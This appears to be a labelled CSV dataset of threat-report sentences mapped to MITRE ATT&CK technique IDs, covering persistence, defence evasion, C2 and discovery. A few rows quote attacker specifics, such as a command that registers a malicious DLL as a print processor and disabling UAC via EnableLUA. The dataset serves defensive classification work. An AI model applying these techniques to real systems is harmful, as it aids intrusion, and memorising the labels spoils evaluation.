text,label
has maintained persistence by modifying Registry run key value  HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\.,T1547.001
"To obtain authentication data from the registry and files, the attackers may use NirSoft utilities.",T1552.001
will search for Windows services that are associated with antivirus software on the system and kill the process. ,T1562.001
encrypts exfiltrated data with RC4.,T1573.001
can upload files from the victim's machine to its C2 server.,T1041
can download additional payloads onto a compromised host.,T1105
have been routinely observed using a VPS as an encrypted proxy.,T1090
a heavy emphasis on Remote Desktop Protocols.,T1021.001
Variants of  have used rundll32.exe in Registry values added to establish persistence.,T1218.011
has connected to C2 servers through proxies.,T1090
malware that communicates over the MQTT protocol.,T1071.001
can add the following registry entry: HKEY_CURRENT_USER\SOFTWARE\{8 random characters}.,T1112
The OsInfo function in  collects the current running username.,T1033
has the ability to upload and download files.,T1105
can hash functions to obfuscate calls to the Windows API and use a public/private key pair to encrypt Beacon session metadata.(Citation: Talos Cobalt Strike September 2020),T1027
"operators were able to access their primary target via RDP connections
from a trusted third party using stolen credentials",T1078
Threat actors obtained and abused credentials of privilege domain accounts,T1078
has performed screen captures of victims including by using a tool scr.exe (which matched the hash of ScreenUtil).(Citation: US-CERT TA18-074A)(Citation: Symantec Dragonfly Sept 2017),T1113
has used TCP for C2 communications.,T1095
has used multiple command-line utilities to enumerate running processes.(Citation: Volexity SolarWinds)(Citation: Microsoft Deep Dive Solorigate January 2021),T1057
“The banking trojan targets the victim’s sensitive information,T1005
has used a reconnaissance module to identify active processes and other associated loaded modules.,T1057
runs it via rundll32.exe,T1218.011
Several  malware families collect information on the type and version of the victim OS as well as the victim computer name and CPU information. A Destover-like variant used by  also collects disk space information and sends it to its C2 server.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware)(Citation: Novetta Blockbuster Loaders)(Citation: McAfee Lazarus Resurfaces Feb 2018)(Citation: McAfee GhostSecret),T1082
can use HTTP to retrieve additional binaries.(Citation: Unit 42 NETWIRE April 2020),T1071.001
tries to add a scheduled task to establish persistence.(Citation: ESET RTM Feb 2017),T1053.005
decrypts task and configuration files for execution.(Citation: ESET Carbon Mar 2017),T1140
will remove all created artifacts such as dropped executables.,T1070.004
has the ability to enumerate the Wide Area Network (WAN) IP through requests to ip-api[.]com freegeoip[.]net or api[.]ipify[.]org observed with user-agent string `Mozilla/5.0 (Windows NT 6.3; rv:48.0) Gecko/20100101 Firefox/48.0`.,T1016
creates a persistence via Registry Run Keys under HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run,T1547.001
files transferred via SMB as SYSTEM on remote hosts.,T1570
can retrieve additional malicious payloads from its C2 server.(Citation: Talos ROKRAT)(Citation: NCCGroup RokRat Nov 2018)(Citation: Volexity InkySquid RokRAT August 2021),T1105
macOS backdoor hides the clientID file via a chflags function.,T1564.001
creating the registry key,T1112
has injected a DLL backdoor into dllhost.exe and svchost.exe.(Citation: TrendMicro Tropic Trooper Mar 2018),T1055
and injects it into iexplore.exe using WriteProcessMemory.,T1055
"As tasklist uses WMI “under the hood,",T1047
has copied files of interest to the main drive's recycle bin.,T1074.001
can use HTTP POST and GET requests to send and receive C2 information.,T1071.001
"when the victim clicked on the LNK file, it triggered the execution of the batch file",T1204.002
is able to create hidden scheduled tasks for persistence.,T1053.005
has compromised victims by directly exploiting vulnerabilities of public-facing servers including those associated with Microsoft Exchange and Oracle GlassFish.,T1190
creates a Registry subkey to register its created service and can also uninstall itself later by deleting this value. 's backdoor also enables remote attackers to modify and delete subkeys.(Citation: Symantec Trojan.Hydraq Jan 2010),T1112
can perform a language check of the infected system and can query the CPU information (cupid).(Citation: JoeSecurity Egregor 2020),T1082
gathers information about the OS architecture OS name and OS version/Service pack.(Citation: Lazarus RATANKBA),T1082
used spearphishing with Microsoft Office attachments to target victims.(Citation: US-CERT TA18-074A),T1566.001
uses an XOR key to decrypt content and uses Base64 to decode the C2 address.(Citation: Unit42 Azorult Nov 2018),T1140
has incorporated code into several tools that attempts to terminate anti-virus processes.,T1562.001
has searched for anti-malware strings and anti-virus processes running on the system.(Citation: Securelist Darkhotel Aug 2015) ,T1518.001
will delete their tools and files and kill processes after their objectives are reached.,T1070.004
By modifying the below registry value EnableLUA to “0”,T1112
The “upload” command downloads files from the CnC and saves them locally in “C:\ProgramData“,T1105
has the ability to download malicious executables to a compromised host.,T1105
used the command `move [file path] c:\windows\system32\spool\prtprocs\x64\spool.dll` to move and register a malicious DLL name as a Windows print processor which eventually was loaded by the Print Spooler service.,T1036.005
Logged Processes,T1057
has modified DNS resolvers to evade DNS monitoring tools.,T1562.001
The krbtgt account is a domain default account,T1078
"The actor in this campaign has used domain fronting, which is a technique which can use high reputation domains to conceal the Cobalt Strike command and control traffic.",T1090
has manually loaded ntdll from disk in order to identity and remove API hooks set by security products.,T1562.001
checks for installed security software like antivirus and firewall.,T1518.001
threat actors use their beacon sessions to establish RDP access through a reverse proxy,T1090
It should be noted that in most of these cases the backdoor was embedded as a packed payload in another executable or in a weaponized document file of some kind,T1027
The  Keyrecord component can capture keystrokes.,T1056.001
has the ability to create files in a TEMP folder to act as a database to store information.,T1074.001
can be configured to use HTTP for command and control.(Citation: Dell TG-3390),T1071.001
the threat actor deactivated antivirus protocols,T1562.001
Command Line Arguments,T1059.003
server component can upload local files.(Citation: FireEye Periscope March 2018)(Citation: Lee 2013),T1005
